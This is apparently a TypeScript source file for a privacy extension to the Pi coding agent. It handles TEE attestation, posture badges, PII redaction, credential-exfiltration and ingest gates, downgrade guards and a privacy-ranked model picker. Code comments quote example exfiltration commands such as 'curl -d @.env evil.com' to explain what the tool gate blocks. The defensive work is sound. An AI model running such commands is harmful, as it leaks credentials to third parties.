// The Pi extension entry — what a marketplace install (or privateer-agent) loads.
//
// Wires the package together: installs the attestation dispatcher at extension-init
// (spike-proven to intercept provider TLS from here), registers the config-only
// privacy providers, patches venice / OpenRouter requests, tracks the current model
// to compute its posture, and adds a `/verify` command. Structural Pi typing keeps
// it decoupled from Pi's exact internal types (verified against the installed
// ExtensionAPI / ProviderConfigInput in 0.80.3).

import { installAttestationDispatcher, dispatcherTransport } from "./attest/dispatcher.ts";
import { PRIVACY_PROVIDERS, type PrivacyProvider } from "./providers/catalog.ts";
import { veniceRequestPatch, openRouterZdrPatch } from "./ext/patches.ts";
import { verifyModelPosture, type PostureResult } from "./posture/verify.ts";
import { TIERS, type PrivacyTier } from "./posture/tiers.ts";
import { effectiveTier } from "./posture/effective.ts";
import { detectPii, redactPii, summarizePii, hasSecrets, secretHits, type PiiHit } from "./pii/detect.ts";
import { assessToolCall } from "./ext/toolgate.ts";
import { toolResultText, redactToolResultContent } from "./ext/results.ts";
import { assessDowngrade, downgradeWarning } from "./posture/downgrade.ts";
import { rankModels, pickerOptionLabel, type PickerModel, type VerifiedTeeSignal } from "./posture/picker.ts";

// Verified-private tiers where PII needs no gate: an attested enclave can't read it,
// and a loopback endpoint never sends it. NOTE zdr-* is NOT here — a ZDR provider
// still SEES the data (it just doesn't retain it), so PII exposure remains.
function isVerifiedPrivate(tier: PrivacyTier | undefined): boolean {
  return tier === "tee-verified" || tier === "local";
}

// Extract the outbound message text for detection, and redact PII structurally in the
// payload's message content (string or content-part arrays).
function payloadText(payload: any): string {
  try {
    return JSON.stringify(payload?.messages ?? payload ?? "");
  } catch {
    return "";
  }
}
function redactPayloadPii(payload: any): any {
  if (!payload || typeof payload !== "object" || !Array.isArray(payload.messages)) return payload;
  const messages = payload.messages.map((m: any) => {
    if (typeof m?.content === "string") return { ...m, content: redactPii(m.content) };
    if (Array.isArray(m?.content)) {
      return {
        ...m,
        content: m.content.map((p: any) => (typeof p?.text === "string" ? { ...p, text: redactPii(p.text) } : p)),
      };
    }
    return m;
  });
  return { ...payload, messages };
}

// ── structural Pi surface (subset we use) ────────────────────────────────────
interface PiModel {
  provider?: string;
  id?: string;
  name?: string;
  baseUrl?: string;
}
// The model registry Pi exposes on event/command contexts. getAvailable() is the
// models the user has auth for (the honest set to offer in a picker); getAll() is
// every configured model. Both feature-detected — a restricted context may omit them.
interface PiModelRegistry {
  getAvailable?(): PiModel[];
  getAll?(): PiModel[];
}
interface PiCtx {
  hasUI?: boolean;
  modelRegistry?: PiModelRegistry;
  getModel?(): PiModel | undefined;
  ui?: {
    notify?: (message: string, level?: string) => void;
    select?: (title: string, options: string[], opts?: unknown) => Promise<string | undefined>;
    // Badge render surfaces, in descending preference. Present on event contexts (not
    // the restricted command context), and each host UI/mode may expose a different
    // subset — so every one is feature-detected before use and the badge walks a
    // fallback chain (see badgeSinks) rather than depending on any single method.
    setStatus?: (key: string, text: string | undefined) => void;
    setWidget?: (key: string, content: string[] | undefined, options?: unknown) => void;
    setTitle?: (title: string) => void;
  };
}
interface PiExtensionApiLike {
  registerProvider?(name: string, config: unknown): void;
  // Used by the downgrade guard to REVERT a model switch the user declines, and by the
  // /models picker to APPLY a chosen model. Returns false when no API key is available.
  // Feature-detected: without it the guard degrades to a warning and the picker says so.
  setModel?(model: unknown): boolean | Promise<boolean>;
  registerCommand?(
    name: string,
    options: { description?: string; handler: (args: unknown, ctx: PiCtx) => unknown },
  ): void;
  on(event: string, handler: (event: any, ctx: PiCtx) => any): void;
}

export interface PiPrivacyOptions {
  // Install the process-wide attestation dispatcher (default true). Set false if the
  // host already installed one (e.g. privateer-agent's boot.ts).
  installDispatcher?: boolean;
  // Register the config-only privacy providers (privateer/tinfoil/nearai/venice/
  // ollama) with seed models (default true). Built-in providers
  // (openrouter/fireworks) are left
  // to Pi so their model listings aren't clobbered.
  registerProviders?: boolean;
  // Enforce OpenRouter ZDR routing (default false — opt-in, since a model with no
  // zero-retention endpoint will 404 rather than fall back). VERIFIED honest: when
  // on, requests carry provider.{zdr:true,data_collection:"deny"}, which OpenRouter
  // observably enforces (it 404s if unsatisfiable), so the zdr-enforced badge is earned.
  enforceOpenRouterZdr?: boolean;
  // Called whenever the current model's posture is (re)computed — the badge feed.
  onPosture?: (result: PostureResult) => void;
  // Bind Tinfoil attestation to the real provider connection via the dispatcher
  // (default true when the dispatcher is installed). Falls back to httpsTransport.
  useDispatcherTransport?: boolean;
  // Override the tier resolution for providers pi-privacy doesn't know (e.g. a host's
  // private account channel). Return a PrivacyTier to use it (drives the PII gate +
  // badge), or undefined to fall back to pi-privacy's built-in verified posture.
  resolveTier?: (provider: string, modelId: string) => Promise<PrivacyTier | undefined> | PrivacyTier | undefined;
  // Capability signal for the `/models` picker ONLY: the host's Privateer ACCOUNT
  // channel can verify a model on select, so Privateer can be shown as "◆ Verifiable
  // TEE" (verifies on select) instead of its "⚠ ZDR (by policy)" floor. PER-MODEL:
  // pass a predicate, since a host verifies some Privateer models (its TEE channel) but
  // not others (its ZDR channel) — e.g. `(m) => loggedIn && privateerChannel(m.id) ===
  // "tee"`. A bare `true` applies uniformly. This is a CEILING/capability marker, never
  // a live verdict — the real posture still comes from resolveTier (or verifyModelPosture)
  // when a model is actually selected. Code-only and NOT settable from zero-code config
  // on purpose: it lifts a privacy LABEL, so only a host that genuinely operates the
  // account channel may assert it.
  privateerVerifiedTee?: VerifiedTeeSignal;
  // Posture-aware structured-PII policy on outbound requests. "warn" (default):
  // interactively warn + offer redact before sending PII down an UNVERIFIED channel;
  // "redact": silently mask; "off": disabled. Only acts below verified-TEE/local
  // (an attested/on-device channel is safe), and only where a UI can prompt. Detection
  // is best-effort structured PII + secrets (emails/phones/SSNs/cards/IPs, API keys/
  // tokens/private keys) — NOT a guarantee.
  piiPolicy?: "warn" | "redact" | "off";
  // Show the live posture badge (default true). Updates on model switch + each request
  // so "verified vs asserted" is always glanceable, never on-demand-only.
  showBadge?: boolean;
  // Ordered fallback chain of UI surfaces for the badge. The FIRST one the current UI
  // actually exposes is used, so the badge still renders across host UIs/modes that
  // support different methods (not every context has setStatus). Default:
  // ["status","widget","title"] — the non-intrusive surfaces first, title as a
  // broad-reach last resort. Add "notify" to also surface changes as messages.
  badgeSinks?: BadgeSink[];
  // The key the badge writes under (setStatus/setWidget are keyed) so a host can
  // namespace or replace it. Default "pi-privacy".
  badgeKey?: string;
  // Fully custom badge renderer — overrides the sink chain entirely. Receives the
  // computed badge text, the tier, and the current context. Use to route the badge
  // anywhere (a custom widget, an external status line, telemetry).
  renderBadge?: (badge: string, tier: PrivacyTier | undefined, ctx: PiCtx) => void;
  // Guard PII/secrets leaving the machine via a TOOL call (bash curl, web-fetch, an
  // MCP tool, …) — ORTHOGONAL to model posture (a TEE/ZDR model doesn't stop a tool
  // exfiltrating data to a third party). "warn" (default): interactively confirm
  // before an egress tool call carrying PII/secrets; "block": always block such calls;
  // "off": disabled. In warn mode with no UI, a CREDENTIAL leak is blocked (loud +
  // safe) while mere PII is allowed with a notice.
  toolExfilPolicy?: "warn" | "block" | "off";
  // Guard credentials arriving IN a tool result — the ingest side. Every other gate
  // judges data on its way out; none watch what a `read .env` / `bash: env` / fetched
  // dump pulls INTO the session. Once a secret is in a tool result it is re-sent to
  // the provider on every later turn AND written to the plaintext session file on
  // disk, where it outlives the session. Redacting at ingest is strictly stronger
  // than warning at send — the secret never enters the transcript to begin with.
  // "warn" (default): prompt, offering to redact before it lands; "redact": always
  // mask; "off": disabled. CREDENTIALS ONLY (API keys, tokens, private keys) — not
  // consumer PII, because rewriting an email out of a file the agent is about to edit
  // corrupts its view of that file for no privacy gain. Independent of model posture:
  // a verified enclave doesn't stop the secret being written to your disk. With no UI
  // it redacts (loud + safe, mirroring the tool gate's credential default).
  toolResultPolicy?: "warn" | "redact" | "off";
  // Guard against a POSTURE DOWNGRADE: switching to a weaker-tier model re-sends the
  // whole accumulated session history — everything the private channel was
  // protecting — to the new provider on the very next turn. No per-request gate can
  // see this, because nothing about the request changed; only the transition reveals
  // it. "warn" (default): prompt when the tier drops and the context is known to
  // carry PII/secrets, offering to revert the switch; "block": always revert such a
  // switch; "off": disabled. With no UI, a downgrade carrying CREDENTIALS is
  // reverted (mirroring the tool gate's loud-and-safe default), mere PII notified.
  downgradePolicy?: "warn" | "block" | "off";
  // Register the `/models` command (default true): a privacy-ranked picker that lists
  // the models you can actually use, strongest privacy first, each labeled with what
  // it can offer — turning pi-privacy from an observer of your model choice into a
  // help for making it. Honest by construction: an attestable TEE model shows as
  // "Verifiable TEE" (a capability), never the live "Verified" badge, until you pick
  // it and attestation runs.
  modelPicker?: boolean;
  // The command name the picker registers under (default "models"; Pi's built-in is
  // the singular "model"). A host can rename it to avoid a clash with another extension.
  modelPickerCommand?: string;
}

// Config-only providers Pi doesn't ship: register these. Built-ins + custom skipped.
const BUILTIN = new Set(["openrouter", "fireworks"]);
const SEED_MODELS: Record<string, string> = {
  tinfoil: "deepseek-v4-pro",
  nearai: "zai-org/GLM-5.1-FP8",
  venice: "qwen3-coder-480b-a35b-instruct-turbo",
  ollama: "llama3.1",
  privateer: "near/zai-org/GLM-5.1-FP8",
};

function registerable(p: PrivacyProvider): boolean {
  return !!p.baseUrl && !BUILTIN.has(p.id) && p.id !== "custom";
}

// The status-bar badge for a tier. A glyph keyed off the traffic-light posture keeps
// verified (green 🛡) visibly distinct from asserted (yellow ⚠) and standard (• none)
// — the whole verified-vs-claimed thesis, made glanceable. `undefined` tier (not yet
// computed) shows a neutral pending marker rather than overclaiming a ceiling.
function postureBadge(tier: PrivacyTier | undefined): string {
  if (!tier) return "⋯ checking privacy";
  const info = TIERS[tier];
  const glyph =
    info.posture === "green" ? "🛡" : info.posture === "yellow" ? "⚠" : info.posture === "red" ? "⛔" : "•";
  return `${glyph} ${info.label}`;
}

// A UI surface the badge can render to. `status` (footer) and `widget` (line above
// the editor) are dedicated extension surfaces that don't disturb other UI; `title`
// replaces the session title (a broad-reach last resort); `notify` fires a message
// (used only on change, since paintBadge de-dupes). The badge walks the configured
// chain and renders to the FIRST surface the current UI actually exposes.
export type BadgeSink = "status" | "widget" | "title" | "notify";

function renderBadgeTo(
  ui: NonNullable<PiCtx["ui"]>,
  sink: BadgeSink,
  key: string,
  badge: string,
  tier: PrivacyTier | undefined,
): boolean {
  switch (sink) {
    case "status":
      if (typeof ui.setStatus === "function") return ui.setStatus(key, badge), true;
      return false;
    case "widget":
      if (typeof ui.setWidget === "function") return ui.setWidget(key, [badge]), true;
      return false;
    case "title":
      if (typeof ui.setTitle === "function") return ui.setTitle(badge), true;
      return false;
    case "notify":
      if (typeof ui.notify === "function")
        return ui.notify(badge, TIERS[tier ?? "standard"].posture === "green" ? "info" : "warning"), true;
      return false;
    default:
      return false;
  }
}

function providerConfig(p: PrivacyProvider): unknown {
  const seed = SEED_MODELS[p.id];
  const models = seed
    ? [
        {
          id: seed,
          name: seed,
          reasoning: false,
          input: ["text"] as ("text" | "image")[],
          cost: { input: 0, output: 0, cacheRead: 0, cacheWrite: 0 },
          contextWindow: 128000,
          maxTokens: 4096,
        },
      ]
    : [];
  const cfg: Record<string, unknown> = { name: p.label, baseUrl: p.baseUrl, api: p.api, models };
  if (p.keyEnv) {
    cfg.apiKey = p.keyEnv; // env template ${...}; Pi resolves it
    cfg.authHeader = true;
  } else if (p.local && models.length) {
    // Pi requires apiKey (or oauth) whenever a provider defines models. Local
    // servers (ollama) ignore the auth header, so a placeholder satisfies the
    // validation without sending a meaningful credential.
    cfg.apiKey = "local";
  }
  return cfg;
}

function nearApiKey(): string | undefined {
  // Both spellings are used in the wild (see privateer redact.ts).
  return process.env.NEARAI_API_KEY ?? process.env.NEAR_AI_API_KEY;
}

export function makePiPrivacyExtension(opts: PiPrivacyOptions = {}) {
  const {
    installDispatcher = true,
    registerProviders = true,
    enforceOpenRouterZdr = false,
    onPosture,
    useDispatcherTransport = true,
    piiPolicy = "warn",
    showBadge = true,
    badgeSinks = ["status", "widget", "title"],
    badgeKey = "pi-privacy",
    renderBadge,
    toolExfilPolicy = "warn",
    toolResultPolicy = "warn",
    downgradePolicy = "warn",
    modelPicker = true,
    modelPickerCommand = "models",
    resolveTier,
    privateerVerifiedTee = false,
  } = opts;

  return function piPrivacy(pi: PiExtensionApiLike): void {
    if (installDispatcher) installAttestationDispatcher();

    if (registerProviders && typeof pi.registerProvider === "function") {
      for (const p of PRIVACY_PROVIDERS) {
        if (registerable(p)) pi.registerProvider(p.id, providerConfig(p));
      }
    }

    let currentProviderId: string | undefined;
    let currentModelId: string | undefined;
    // The VERIFIED tier of the current model (attestation result), cached for the PII
    // gate. Undefined until computed → the gate treats "unknown" as not-verified (safe).
    let currentTier: PrivacyTier | undefined;
    // Session PII decision so we don't re-prompt every turn once the user has chosen.
    let piiChoice: "ask" | "send" | "redact" = "ask";
    // Session decision for the tool-exfil gate (allow egress with sensitive data).
    let toolAllow = false;
    // Session decision for the tool-RESULT (ingest) gate, so we don't re-prompt on
    // every credential-bearing result once the user has chosen.
    let resultChoice: "ask" | "redact" | "keep" = "ask";

    // ── downgrade-guard state ────────────────────────────────────────────────
    // The tier the accumulated context was protected by at the moment of the last
    // switch, and the model to hand back to pi.setModel() if the user declines.
    let previousTier: PrivacyTier | undefined;
    let previousModel: unknown;
    // One prompt per transition: the guard runs twice (on the switch, using the new
    // model's ceiling, then again once attestation resolves the real tier, which can
    // only be lower). This latches after the first one that actually fires.
    let downgradeHandled = true;
    // What the last outbound payload was known to carry. Cached on EVERY request —
    // including verified-private ones, where the PII gate itself is skipped —
    // precisely so the guard knows what a private session accumulated before the
    // switch. Scanning is local, deterministic, and a few ms even on a full context.
    let contextHits: PiiHit[] = [];

    // The latest UI surface we've seen — captured from event contexts (the command
    // context is restricted), so refreshPosture() can paint the badge even though
    // model_select fires it without threading ctx through. `lastBadge` de-dupes so an
    // unchanged posture never re-renders (keeps a "notify" sink from spamming).
    let lastUi: NonNullable<PiCtx["ui"]> | undefined;
    let lastCtx: PiCtx | undefined;
    let lastBadge: string | undefined;
    // Whether the host can actually prompt. Captured alongside the UI because
    // guards that run detached from an event (the downgrade guard's second pass,
    // after attestation resolves) have no ctx of their own — and treating a TUI as
    // non-interactive would silently apply the no-UI fallback instead of asking.
    let lastHasUI = false;
    const captureUi = (ctx: PiCtx | undefined) => {
      if (ctx?.ui) ((lastUi = ctx.ui), (lastCtx = ctx), (lastHasUI = !!ctx.hasUI));
    };
    const paintBadge = () => {
      if (!showBadge || !lastUi) return;
      const badge = postureBadge(currentTier);
      if (badge === lastBadge) return; // unchanged → no-op
      let rendered = false;
      if (renderBadge) ((renderBadge(badge, currentTier, lastCtx!)), (rendered = true));
      else {
        for (const sink of badgeSinks) {
          if (renderBadgeTo(lastUi, sink, badgeKey, badge, currentTier)) {
            rendered = true;
            break;
          }
        }
      }
      if (rendered) lastBadge = badge; // only commit once something actually drew it
    };

    // Recompute posture for the current model; cache the tier and publish the badge.
    const refreshPosture = async () => {
      if (!currentProviderId || !currentModelId) return;
      // A host-supplied resolver (e.g. a private account channel pi-privacy doesn't
      // know) wins — otherwise use the built-in verified posture.
      if (resolveTier) {
        const t = await resolveTier(currentProviderId, currentModelId);
        if (t !== undefined) {
          currentTier = t;
          onPosture?.({ providerId: currentProviderId, modelId: currentModelId, tier: t });
          paintBadge();
          void guardDowngrade(t);
          return;
        }
      }
      const result = await verifyModelPosture(currentProviderId, currentModelId, {
        apiKey: currentProviderId === "nearai" ? nearApiKey() : undefined,
        zdrEnforced: currentProviderId === "openrouter" && enforceOpenRouterZdr,
        transport: useDispatcherTransport && installDispatcher ? dispatcherTransport : undefined,
      });
      currentTier = result.tier;
      onPosture?.(result);
      paintBadge();
      // Re-check with the VERIFIED tier: a model whose ceiling looked fine can land
      // lower (attestation failed → tee-unverified), and that's still a downgrade.
      void guardDowngrade(result.tier);
    };

    // The posture-downgrade guard. Runs on a model switch and again once attestation
    // resolves, because the incoming tier can only get WORSE than its ceiling.
    // Fires only when the tier actually drops AND the context is known to carry
    // sensitive material — a bare tier change is what the badge is for.
    const guardDowngrade = async (toTier: PrivacyTier | undefined, ctx?: PiCtx) => {
      if (downgradePolicy === "off" || downgradeHandled) return;
      const a = assessDowngrade(previousTier, toTier, contextHits);
      if (!a.downgrade || a.severity === "none") return;
      downgradeHandled = true; // one prompt per transition

      const label = currentProviderId
        ? `${currentProviderId}${currentModelId ? `/${currentModelId}` : ""}`
        : undefined;
      const warning = downgradeWarning(a, contextHits, label);
      const revert = async () => {
        if (previousModel === undefined || typeof pi.setModel !== "function") {
          // Nothing to revert to (or the host can't switch) — say so rather than
          // implying the session was protected.
          (ctx?.ui ?? lastUi)?.notify?.(`${warning} Could not revert the switch automatically.`, "warning");
          return;
        }
        await pi.setModel(previousModel);
        (ctx?.ui ?? lastUi)?.notify?.(`Reverted to ${TIERS[a.from].label} — session context stays put.`, "info");
      };

      if (downgradePolicy === "block") return revert();

      const ui = ctx?.ui ?? lastUi;
      if ((ctx?.hasUI ?? lastHasUI) && typeof ui?.select === "function") {
        const choice = await ui.select(warning, [
          "Stay on the previous model",
          "Switch anyway",
          "Switch, redacting PII from now on",
        ]);
        if (choice === "Switch anyway") return;
        if (choice === "Switch, redacting PII from now on") {
          piiChoice = "redact";
          return;
        }
        return revert(); // explicit "Stay", or cancelled → the safe default
      }

      // No UI (print/JSON, automated): mirror the tool gate — a CREDENTIAL following
      // the session downhill is reverted (loud + safe), mere PII passes with a notice.
      if (a.severity === "secret") return revert();
      ui?.notify?.(warning, "warning");
    };

    pi.on("model_select", (event, ctx) => {
      const model = event?.model as PiModel | undefined;
      // Snapshot what the context was protected by BEFORE overwriting it — that's
      // the ceiling the accumulated history was written under.
      previousTier = currentTier;
      previousModel = event?.previousModel;
      downgradeHandled = false; // arm the guard for this transition
      currentProviderId = model?.provider;
      currentModelId = model?.id;
      captureUi(ctx);
      currentTier = undefined; // don't show the old model's badge while re-verifying
      paintBadge(); // pending marker until attestation resolves
      // Check against the incoming model's CEILING immediately, so the warning lands
      // before a turn can start; refreshPosture() re-checks with the verified tier.
      void guardDowngrade(
        effectiveTier(currentProviderId ?? "", {
          zdrEnforced: currentProviderId === "openrouter" && enforceOpenRouterZdr,
        }),
        ctx,
      );
      void refreshPosture();
    });

    // Per-provider request patches + the posture-aware PII gate.
    pi.on("before_provider_request", async (event, ctx) => {
      captureUi(ctx); // keep the badge alive even if model_select had no UI
      paintBadge();
      let payload = event?.payload;
      // Provider-specific patches first (scoped to the current provider).
      if (currentProviderId === "venice") payload = veniceRequestPatch(payload);
      else if (currentProviderId === "openrouter" && enforceOpenRouterZdr) payload = openRouterZdrPatch(payload);

      // Scan the outbound payload — the full context that would be re-sent — and
      // cache the result for the downgrade guard. Done for EVERY tier, including
      // verified-private ones where the gate below is skipped: knowing what a
      // private session accumulated is the whole basis for guarding the switch out
      // of it. (Local + deterministic; a few ms on a full context.)
      const hits = detectPii(payloadText(payload));
      contextHits = hits;

      // PII gate: only below a VERIFIED-private tier (TEE-verified/local are safe —
      // the provider can't read the data), and only where we can actually prompt.
      if (piiPolicy !== "off" && !isVerifiedPrivate(currentTier)) {
        if (hits.length > 0) {
          let action: "send" | "redact" =
            piiChoice !== "ask" ? piiChoice : piiPolicy === "redact" ? "redact" : "send";
          if (piiChoice === "ask" && piiPolicy === "warn" && ctx?.hasUI && typeof ctx.ui?.select === "function") {
            const tierLabel = TIERS[currentTier ?? "standard"].label;
            const kind = hasSecrets(hits) ? "secrets/PII" : "structured PII";
            const choice = await ctx.ui.select(
              `⚠ ${summarizePii(hits)} detected — sending to an unverified channel (${tierLabel}). ` +
                `Best-effort ${kind} detection only, not a guarantee.`,
              ["Send as-is", "Redact PII", "Redact + remember for session", "Send + remember for session"],
            );
            if (choice === "Redact PII") action = "redact";
            else if (choice === "Redact + remember for session") ((action = "redact"), (piiChoice = "redact"));
            else if (choice === "Send + remember for session") ((action = "send"), (piiChoice = "send"));
            else action = "send"; // "Send as-is" or cancelled
          }
          if (action === "redact") payload = redactPayloadPii(payload);
        }
      }

      return payload === event?.payload ? undefined : payload;
    });

    // ── the exfil gate, shared by the model's tools and the user's ! commands ────
    // Deliberately INDEPENDENT of the model's tier — a verified-TEE or ZDR model does
    // nothing to stop a bash/web tool shipping data to a third party. Best-effort
    // egress + structured-detection heuristic, never a guarantee.
    interface EgressVerdict {
      warning: string;
      reason: string;
      secret: boolean;
    }

    // Assess one outbound call. `toolName` drives the assessor (bash gets per-command
    // splitting); `label` is how the call is named to the user. undefined = nothing
    // to fire on.
    const egressVerdict = (toolName: string | undefined, label: string, input: unknown): EgressVerdict | undefined => {
      const assessment = assessToolCall(toolName, input);
      if (!assessment.egress) return undefined;

      const hits = detectPii(payloadText(input));
      const files = assessment.sensitiveFiles ?? [];
      // Neither a literal secret nor a credential FILE in the egress path → nothing
      // we can honestly claim to have caught.
      if (hits.length === 0 && files.length === 0) return undefined;

      // A credential store heading off-machine is credential-severity even though the
      // command carries no literal secret: `curl -d @.env` sends the whole file, and
      // the reference is the only thing detection can see.
      const secret = hasSecrets(hits) || files.length > 0;
      const what = [files.length ? `${files.join(", ")} contents` : "", hits.length ? summarizePii(hits) : ""]
        .filter(Boolean)
        .join(" + ");
      const dest = assessment.target ? ` → ${assessment.target}` : "";
      const reason = `pi-privacy blocked ${secret ? "credential" : "PII"} exfiltration via ${label}`;
      const warning =
        `⚠ ${label} is about to send ${what} off this machine${dest}. ` +
        `A private (TEE/ZDR) model does NOT protect a tool call. Best-effort detection, not a guarantee.`;
      return { warning, reason, secret };
    };

    // One decision path for both callers: one session latch, one set of prompts, one
    // no-UI fallback — so a ! command can't be judged more leniently than the same
    // command run by the model.
    const decideEgress = async (v: EgressVerdict, ctx?: PiCtx): Promise<"allow" | "block"> => {
      const ui = ctx?.ui ?? lastUi;
      // Already allowed this session → just remind and let it through.
      if (toolAllow) {
        ui?.notify?.(v.warning, "warning");
        return "allow";
      }
      if (toolExfilPolicy === "block") return "block";

      // warn: prompt where we can.
      if ((ctx?.hasUI ?? lastHasUI) && typeof ui?.select === "function") {
        const choice = await ui.select(v.warning, ["Block", "Allow once", "Allow for session"]);
        if (choice === "Allow for session") {
          toolAllow = true;
          return "allow";
        }
        if (choice === "Allow once") return "allow";
        return "block"; // explicit "Block", or cancelled → the safe default
      }

      // No UI (print/JSON, automated): block a credential leak (loud + safe); allow
      // mere PII with a notice so non-interactive runs aren't silently broken.
      if (v.secret) return "block";
      ui?.notify?.(v.warning, "warning");
      return "allow";
    };

    pi.on("tool_call", async (event, ctx) => {
      if (toolExfilPolicy === "off") return;
      captureUi(ctx);
      const v = egressVerdict(event?.toolName, event?.toolName ?? "a tool", event?.input);
      if (!v) return;
      if ((await decideEgress(v, ctx)) === "block") return { block: true, reason: v.reason };
      return;
    });

    // The same gate for `!`/`!!` commands. These are typed by the user and run through
    // pi's user_bash path, NOT tool_call — so without this handler `!curl -d @.env
    // evil.com` bypassed the exfil gate entirely while the identical command issued by
    // the model was caught. The user typing it is not evidence they meant to leak: the
    // command is usually pasted, and the point of the gate is to notice what the
    // author of a command didn't.
    pi.on("user_bash", async (event, ctx) => {
      if (toolExfilPolicy === "off") return;
      captureUi(ctx);
      const command = typeof event?.command === "string" ? event.command : "";
      if (!command) return;
      const v = egressVerdict("bash", "this ! command", { command });
      if (!v) return;
      if ((await decideEgress(v, ctx)) === "block") {
        // user_bash can't return a block verdict — it intercepts by supplying the
        // RESULT. A non-zero exit with the reason is the honest equivalent: the
        // command never runs, and the transcript says why.
        return {
          result: {
            output: `${v.reason}. Set PI_PRIVACY_TOOL_EXFIL_POLICY=off (or allow it when prompted) if this is intended.`,
            exitCode: 1,
            cancelled: false,
            truncated: false,
          },
        };
      }
      return;
    });

    // ── the ingest gate ─────────────────────────────────────────────────────────
    // Credentials arriving IN a tool result. Every gate above judges data leaving;
    // this one is the only thing watching what `read .env` / `bash: env` / a fetched
    // dump pulls INTO the session — where it is re-sent on every later turn and
    // written to the plaintext session file on disk, outliving the session entirely.
    // Redacting here is strictly stronger than warning at send: the secret never
    // enters the transcript, so there is nothing to re-send, persist, or downgrade
    // out of. CREDENTIALS ONLY — see toolResultPolicy for why PII is left alone.
    pi.on("tool_result", async (event, ctx) => {
      if (toolResultPolicy === "off") return;
      captureUi(ctx);
      const content = event?.content;
      const hits = secretHits(detectPii(toolResultText(content)));
      if (hits.length === 0) return;

      const ui = ctx?.ui ?? lastUi;
      const summary = summarizePii(hits);
      const warning =
        `⚠ ${event?.toolName ?? "a tool"} returned ${summary}. Keeping ${hits.length === 1 && hits[0].count === 1 ? "it" : "them"} ` +
        `in context means re-sending to the provider on every later turn, and writing to the session file on disk in plaintext. ` +
        `Best-effort secret detection, not a guarantee.`;

      let action: "redact" | "keep" =
        resultChoice !== "ask" ? resultChoice : toolResultPolicy === "redact" ? "redact" : "keep";

      if (resultChoice === "ask" && toolResultPolicy === "warn") {
        if ((ctx?.hasUI ?? lastHasUI) && typeof ui?.select === "function") {
          const choice = await ui.select(warning, [
            "Redact the credentials",
            "Keep them in context",
            "Redact for the rest of the session",
            "Keep for the rest of the session",
          ]);
          if (choice === "Redact the credentials") action = "redact";
          else if (choice === "Redact for the rest of the session") ((action = "redact"), (resultChoice = "redact"));
          else if (choice === "Keep for the rest of the session") ((action = "keep"), (resultChoice = "keep"));
          else action = "keep"; // "Keep them in context" or cancelled
        } else {
          // No UI (print/JSON, automated): redact, mirroring the exfil gate's
          // credential default — loud + safe beats silently persisting a key.
          action = "redact";
          ui?.notify?.(`${warning} Redacted (no UI to ask).`, "warning");
        }
      }

      if (action !== "redact") return;
      const redacted = redactToolResultContent(content);
      if (redacted === undefined) {
        // Detected in a shape we can't rewrite safely. Say so — reporting a
        // redaction that didn't happen is exactly the overclaim this package exists
        // to prevent.
        ui?.notify?.(
          `Could not redact ${summary} from ${event?.toolName ?? "the tool"} result — unrecognized result shape. It stays in context.`,
          "warning",
        );
        return;
      }
      return { content: redacted };
    });

    if (typeof pi.registerCommand === "function") {
      pi.registerCommand("verify", {
        description: "Verify the current model's privacy posture (TEE attestation)",
        handler: async (_args, ctx) => {
          if (!currentProviderId || !currentModelId) {
            ctx.ui?.notify?.("No model selected.", "warning");
            return;
          }
          const res = await verifyModelPosture(currentProviderId, currentModelId, {
            apiKey: currentProviderId === "nearai" ? nearApiKey() : undefined,
            zdrEnforced: currentProviderId === "openrouter" && enforceOpenRouterZdr,
            transport: useDispatcherTransport && installDispatcher ? dispatcherTransport : undefined,
          });
          const info = TIERS[res.tier];
          const detail = res.teePosture ? ` [${res.teePosture}]` : "";
          const err = res.error ? ` — ${res.error}` : "";
          ctx.ui?.notify?.(`${info.label}${detail}: ${info.blurb}${err}`, "info");
          // Then the EVIDENCE. The checks here are pragmatic ones suited to an
          // interactive agent, not a full verifier — so the report that produced
          // the verdict has to be inspectable, or "verified" is just our word for
          // it. Emitting it is what lets a user take the same bytes to
          // nearai/cloud-verifier or tinfoil-cli and check our work.
          if (res.attestation !== undefined) {
            let report: string;
            try {
              report = JSON.stringify(res.attestation, null, 2);
            } catch {
              report = String(res.attestation); // never let display kill /verify
            }
            ctx.ui?.notify?.(`attestation report (verify independently):\n${report}`, "info");
          }
        },
      });

      // The privacy-ranked model picker (#2). Lists the models the user can actually
      // use, strongest privacy first, each labeled with what it can offer — so privacy
      // is something you PICK, not just something the badge reports afterward.
      if (modelPicker) {
        pi.registerCommand(modelPickerCommand, {
          description: "Pick a model ranked by privacy (verified TEE / on-device / ZDR first)",
          handler: async (_args, ctx) => {
            const reg = ctx.modelRegistry;
            // getAvailable() = models with auth configured (the honest, switchable set).
            // Fall back to getAll() so the picker still ranks when availability is
            // unknown (some hosts/modes may not populate auth state here).
            const models: PickerModel[] =
              reg?.getAvailable?.() ?? reg?.getAll?.() ?? [];
            if (models.length === 0) {
              ctx.ui?.notify?.(
                "No models to rank (none with configured auth were found).",
                "warning",
              );
              return;
            }

            const ranked = rankModels(models, {
              zdrEnforced: enforceOpenRouterZdr,
              verifiedTee: privateerVerifiedTee,
            });
            const cur = ctx.getModel?.() ?? { provider: currentProviderId, id: currentModelId };
            const isCurrent = (m: PickerModel) => m.provider === cur.provider && m.id === cur.id;

            // Map each option string back to its model. Deterministic order (rankModels
            // sorts stably), so a duplicate label — same tier, provider, id — is a true
            // duplicate and collapsing it is harmless.
            const byLabel = new Map<string, PickerModel>();
            const options = ranked.map((e) => {
              const label = pickerOptionLabel(e, isCurrent(e.model));
              byLabel.set(label, e.model);
              return label;
            });

            // No interactive picker (print/JSON): still surface the ranking as text —
            // useful to SEE which of your models is most private, even headless.
            if (!ctx.hasUI || typeof ctx.ui?.select !== "function") {
              ctx.ui?.notify?.(
                `Models by privacy (strongest first):\n${options.join("\n")}\n` +
                  `◆ = TEE that verifies when selected. Switch with /model.`,
                "info",
              );
              return;
            }

            const choice = await ctx.ui.select(
              "Pick a model (strongest privacy first — ◆ verifies on select):",
              options,
            );
            if (!choice) return; // cancelled
            const model = byLabel.get(choice);
            if (!model) return;
            if (isCurrent(model)) {
              ctx.ui?.notify?.("Already on that model.", "info");
              return;
            }
            if (typeof pi.setModel !== "function") {
              ctx.ui?.notify?.("This host can't switch models programmatically.", "warning");
              return;
            }
            const ok = await pi.setModel(model);
            // On success the model_select event fires refreshPosture() → live badge +
            // attestation, so we don't duplicate that here. false = no API key.
            if (!ok)
              ctx.ui?.notify?.(
                `Could not switch to ${model.provider}/${model.id} — no API key configured for it.`,
                "warning",
              );
          },
        });
      }
    }
  };
}

// Default export: the marketplace-installable extension with default options.
export default makePiPrivacyExtension();
